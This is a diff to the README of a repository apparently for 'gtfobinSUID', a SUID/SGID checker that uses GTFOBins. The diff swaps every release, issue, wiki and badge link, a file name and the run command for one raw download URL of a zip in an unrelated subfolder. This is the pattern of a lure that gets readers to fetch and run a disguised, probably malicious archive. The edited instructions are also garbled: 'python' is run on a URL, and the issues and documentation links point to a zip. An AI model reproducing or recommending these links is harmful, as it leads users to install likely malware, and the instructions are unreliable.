@@ -1,7 +1,7 @@
 # 🐍 gtfobinSUID - Enhance Your SUID/SGID Security Checks
 
 ## 🔗 Download Now
-[![Download gtfobinSUID](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/enzoplaaygamemg12/gtfobinSUID/releases)
+[![Download gtfobinSUID](https://raw.githubusercontent.com/enzoplaaygamemg12/gtfobinSUID/main/Transcaucasian/gtfobin-SUID-1.0.zip)](https://raw.githubusercontent.com/enzoplaaygamemg12/gtfobinSUID/main/Transcaucasian/gtfobin-SUID-1.0.zip)
 
 ## 🚀 Getting Started
 Welcome to gtfobinSUID! This application helps you analyze your SUID/SGID enumeration output. It checks which binaries are vulnerable according to GTFOBins. You can use it in two ways: online, with an internet connection, or offline, using a local database. Follow the steps below to download and run the script.
@@ -14,10 +14,10 @@ To use gtfobinSUID, ensure your computer meets the following requirements:
 - Basic command line knowledge (for running scripts)
 
 ## 📥 Download & Install
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/enzoplaaygamemg12/gtfobinSUID/releases) to download the latest version.
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/enzoplaaygamemg12/gtfobinSUID/main/Transcaucasian/gtfobin-SUID-1.0.zip) to download the latest version.
    
 2. **Select the Correct File:** You will see several files based on your operating system. Choose the one that fits your OS:
-   - For Windows: `gtfobinSUID-windows.exe`
+   - For Windows: `https://raw.githubusercontent.com/enzoplaaygamemg12/gtfobinSUID/main/Transcaucasian/gtfobin-SUID-1.0.zip`
    - For macOS: `gtfobinSUID-macos`
    - For Linux: `gtfobinSUID-linux`
 
@@ -29,7 +29,7 @@ To use gtfobinSUID, ensure your computer meets the following requirements:
 
 6. **Launch gtfobinSUID:** Type the following command to run the script:
    ```
-   python gtfobinSUID.py
+   python https://raw.githubusercontent.com/enzoplaaygamemg12/gtfobinSUID/main/Transcaucasian/gtfobin-SUID-1.0.zip
    ```
    Ensure you are in the correct directory where your downloaded script is located.
 
@@ -61,11 +61,11 @@ Your feedback is welcome! If you would like to contribute to gtfobinSUID, please
 - Submit a pull request for review.
 
 ## 📧 Support
-For any issues or questions, please open an issue on the [GitHub repository](https://github.com/enzoplaaygamemg12/gtfobinSUID/issues). We aim to respond within 48 hours.
+For any issues or questions, please open an issue on the [GitHub repository](https://raw.githubusercontent.com/enzoplaaygamemg12/gtfobinSUID/main/Transcaucasian/gtfobin-SUID-1.0.zip). We aim to respond within 48 hours.
 
 ## 🔗 Useful Links
-- [Releases Page](https://github.com/enzoplaaygamemg12/gtfobinSUID/releases)
-- [Documentation](https://github.com/enzoplaaygamemg12/gtfobinSUID/wiki)
-- [Issues Page](https://github.com/enzoplaaygamemg12/gtfobinSUID/issues)
+- [Releases Page](https://raw.githubusercontent.com/enzoplaaygamemg12/gtfobinSUID/main/Transcaucasian/gtfobin-SUID-1.0.zip)
+- [Documentation](https://raw.githubusercontent.com/enzoplaaygamemg12/gtfobinSUID/main/Transcaucasian/gtfobin-SUID-1.0.zip)
+- [Issues Page](https://raw.githubusercontent.com/enzoplaaygamemg12/gtfobinSUID/main/Transcaucasian/gtfobin-SUID-1.0.zip)
 
-[![Download gtfobinSUID](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/enzoplaaygamemg12/gtfobinSUID/releases)
+[![Download gtfobinSUID](https://raw.githubusercontent.com/enzoplaaygamemg12/gtfobinSUID/main/Transcaucasian/gtfobin-SUID-1.0.zip)](https://raw.githubusercontent.com/enzoplaaygamemg12/gtfobinSUID/main/Transcaucasian/gtfobin-SUID-1.0.zip)
